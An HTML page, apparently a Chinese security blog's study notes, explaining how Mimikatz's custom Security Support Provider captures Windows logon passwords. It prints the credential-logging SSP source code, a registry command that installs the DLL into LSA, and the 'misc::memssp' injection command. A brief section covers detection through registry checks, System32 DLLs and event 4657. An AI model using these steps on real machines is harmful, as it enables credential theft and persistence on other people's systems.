@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="本文是对以下文章的学习、记录  https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;windows&#x2F;active-directory-methodology&#x2F;custom-ssp https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;域渗透——Security Support Provider.html https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10167  0x01 介绍SSP 可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【域渗透】Windows-SSP-Mimikatz记录密码">
+<meta property="og:url" content="https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="本文是对以下文章的学习、记录  https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;windows&#x2F;active-directory-methodology&#x2F;custom-ssp https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;域渗透——Security Support Provider.html https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10167  0x01 介绍SSP 可以">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20220304-13:55:39-_S510Dt_wO8jLC_S510Dt_1646373339887_S510Dt_wO8jLC.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20220304-13:57:36-_sByP7n_NEH0bF_sByP7n_1646373456653_sByP7n_NEH0bF.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20220304-13:59:33-_QbUtR3_kgI9eB_QbUtR3_1646373573766_QbUtR3_kgI9eB.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20220304-14:02:36-_srlS5L_6Zrxo6_srlS5L_1646373756858_srlS5L_6Zrxo6.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/20220304-14:10:32-_bNLqnt_L1AL10_bNLqnt_1646374232928_bNLqnt_L1AL10.png">
+<meta property="article:published_time" content="2022-03-07T06:45:42.000Z">
+<meta property="article:modified_time" content="2022-03-07T06:46:18.000Z">
+<meta property="article:author" content="atsud0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/20220304-13:55:39-_S510Dt_wO8jLC_S510Dt_1646373339887_S510Dt_wO8jLC.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>【域渗透】Windows-SSP-Mimikatz记录密码</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-163969429-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friends</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SkeletonKey/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&text=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&title=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【域渗透】Windows-SSP-Mimikatz记录密码&body=Check out this article: https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&title=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&name=【域渗透】Windows-SSP-Mimikatz记录密码&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&t=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Mimikatz-SSP-%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 Mimikatz SSP 利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E9%98%B2%E5%BE%A1%E5%92%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御和检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Regedit"><span class="toc-number">3.1.</span> <span class="toc-text">Regedit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL"><span class="toc-number">3.2.</span> <span class="toc-text">DLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Event"><span class="toc-number">3.3.</span> <span class="toc-text">Event</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        【域渗透】Windows-SSP-Mimikatz记录密码
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">atsud0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-07T06:45:42.000Z" class="dt-published" itemprop="datePublished">2022-03-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>本文是对以下文章的学习、记录</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp">https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp</a></li>
+<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html">https://wooyun.js.org/drops/域渗透——Security Support Provider.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10167">https://xz.aliyun.com/t/10167</a></li>
+</ul>
+<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>SSP 可以简单理解为 DLL，我们可以自己写一个SSP来实现操作系统的更多身份验证，也能实现我们的后门。</p>
+<p>LSA 全称<code>Local Security Authority</code>，Windows里面用于身份认证，常见进程为lsass.exe，LSA的特别之处在于LSA是可扩展的，在系统启动的时候SSP会被加载到进程lsass.exe中。前面说了，我们SSP相当于系统的DLL文件，我们能够自己去写一个SSP，实现更多身份验证，那么相当于我们写的SSP在系统开启的时候会被加载到lsass.exe里面。</p>
+<h1 id="0x02-Mimikatz-SSP-利用"><a href="#0x02-Mimikatz-SSP-利用" class="headerlink" title="0x02 Mimikatz SSP 利用"></a>0x02 Mimikatz SSP 利用</h1><p><code>mimikatz</code>早以支持这个功能,该文件为为<code>mimilib.dll</code>。mimikatz的poc为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kssp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable[] = &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">	kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">kssp_SpInitialize</span><span class="params">(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">kssp_SpShutDown</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">kssp_SpGetInfo</span><span class="params">(PSecPkgInfoW PackageInfo)</span></span><br><span class="line">&#123;</span><br><span class="line">	PackageInfo-&gt;fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;</span><br><span class="line">	PackageInfo-&gt;wVersion   = <span class="number">1</span>;</span><br><span class="line">	PackageInfo-&gt;wRPCID     = SECPKG_ID_NONE;</span><br><span class="line">	PackageInfo-&gt;cbMaxToken = <span class="number">0</span>;</span><br><span class="line">	PackageInfo-&gt;Name       = <span class="string">L&quot;KiwiSSP&quot;</span>;</span><br><span class="line">	PackageInfo-&gt;Comment    = <span class="string">L&quot;Kiwi Security Support Provider&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">kssp_SpAcceptCredentials</span><span class="params">(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE *kssp_logfile;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line">	<span class="keyword">if</span>(kssp_logfile = _wfopen(<span class="string">L&quot;kiwissp.log&quot;</span>, <span class="string">L&quot;a&quot;</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(pop)</span></span><br><span class="line">	&#123;	</span><br><span class="line">		klog(kssp_logfile, <span class="string">L&quot;[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t&quot;</span>, PrimaryCredentials-&gt;LogonId.HighPart, PrimaryCredentials-&gt;LogonId.LowPart, LogonType, &amp;PrimaryCredentials-&gt;DomainName, &amp;PrimaryCredentials-&gt;DownlevelName, AccountName);</span><br><span class="line">		klog_password(kssp_logfile, &amp;PrimaryCredentials-&gt;Password);</span><br><span class="line">		klog(kssp_logfile, <span class="string">L&quot;\n&quot;</span>);</span><br><span class="line">		fclose(kssp_logfile);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS NTAPI <span class="title function_">kssp_SpLsaModeInitialize</span><span class="params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span></span><br><span class="line">&#123;</span><br><span class="line">	*PackageVersion = SECPKG_INTERFACE_VERSION;</span><br><span class="line">	*ppTables = kiwissp_SecPkgFunctionTable;</span><br><span class="line">	*pcTables = ARRAYSIZE(kiwissp_SecPkgFunctionTable);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将mimilib.dll复制到<code>%windir%\System32</code>目录下，注意系统位数，Mimikata提供了32位和64位版本的。</p>
+<p><img src="https://images.atsud0.me/images/post/20220304-13:55:39-_S510Dt_wO8jLC_S510Dt_1646373339887_S510Dt_wO8jLC.png" alt="https://images.atsud0.me/images/post/20220304-13:55:39-_S510Dt_wO8jLC_S510Dt_1646373339887_S510Dt_wO8jLC.png"></p>
+<p><img src="https://images.atsud0.me/images/post/20220304-13:57:36-_sByP7n_NEH0bF_sByP7n_1646373456653_sByP7n_NEH0bF.png" alt="https://images.atsud0.me/images/post/20220304-13:57:36-_sByP7n_NEH0bF_sByP7n_1646373456653_sByP7n_NEH0bF.png"></p>
+<p>打开注册表，修改<code>HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages</code>，添加mimilib.dll。</p>
+<p>命令行快速添加：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span> /t REG_MULTI_SZ /d kerberos\<span class="number">0</span>msv1_0\<span class="number">0</span>schannel\<span class="number">0</span>wdigest\<span class="number">0</span>tspkg\<span class="number">0</span>pku2u\<span class="number">0</span>mimillb.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20220304-13:59:33-_QbUtR3_kgI9eB_QbUtR3_1646373573766_QbUtR3_kgI9eB.png" alt="https://images.atsud0.me/images/post/20220304-13:59:33-_QbUtR3_kgI9eB_QbUtR3_1646373573766_QbUtR3_kgI9eB.png"></p>
+<p>添加好，重启系统后，可在<code>%windir%\System32</code>目录下面找到和POC代码中记录的<code>kiwissp.log</code>文件。</p>
+<p><img src="https://images.atsud0.me/images/post/20220304-14:02:36-_srlS5L_6Zrxo6_srlS5L_1646373756858_srlS5L_6Zrxo6.png" alt="https://images.atsud0.me/images/post/20220304-14:02:36-_srlS5L_6Zrxo6_srlS5L_1646373756858_srlS5L_6Zrxo6.png"></p>
+<p>Mimikatz提供了一个内存更新的方法(注：重启后失效)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;misc::memssp&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20220304-14:10:32-_bNLqnt_L1AL10_bNLqnt_1646374232928_bNLqnt_L1AL10.png" alt="https://images.atsud0.me/images/post/20220304-14:10:32-_bNLqnt_L1AL10_bNLqnt_1646374232928_bNLqnt_L1AL10.png"></p>
+<h1 id="0x03-防御和检测"><a href="#0x03-防御和检测" class="headerlink" title="0x03 防御和检测"></a>0x03 防御和检测</h1><h2 id="Regedit"><a href="#Regedit" class="headerlink" title="Regedit"></a>Regedit</h2><p>检查<code>HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages</code> 项有无异常</p>
+<p>查询注册表命令:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>默认值为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos</span><br><span class="line">msv1_0</span><br><span class="line">schannel</span><br><span class="line">wdigest</span><br><span class="line">tspkg</span><br><span class="line">pku2u</span><br></pre></td></tr></table></figure>
+
+<h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><p>检测<code>%windir%\System32</code>是否有可疑dll文件</p>
+<h2 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h2><p>日志中会出现ID：4657对注册表<code>HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages</code>的修改记录。</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文简单介绍了Mimikatz利用SSP方法和其检查思路。那么我们有没有办法能够不重启、又可以不修改注册表，不放恶意dll在system32目录下的方法呢。除了这个，我们能不能在lsa.exe加载ssp直接连接我们的后门呢？ </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/links/">Friends</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Mimikatz-SSP-%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 Mimikatz SSP 利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E9%98%B2%E5%BE%A1%E5%92%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御和检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Regedit"><span class="toc-number">3.1.</span> <span class="toc-text">Regedit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL"><span class="toc-number">3.2.</span> <span class="toc-text">DLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Event"><span class="toc-number">3.3.</span> <span class="toc-text">Event</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&text=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&title=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【域渗透】Windows-SSP-Mimikatz记录密码&body=Check out this article: https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&title=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&name=【域渗透】Windows-SSP-Mimikatz记录密码&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/&t=【域渗透】Windows-SSP-Mimikatz记录密码"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    atsud0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friends</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
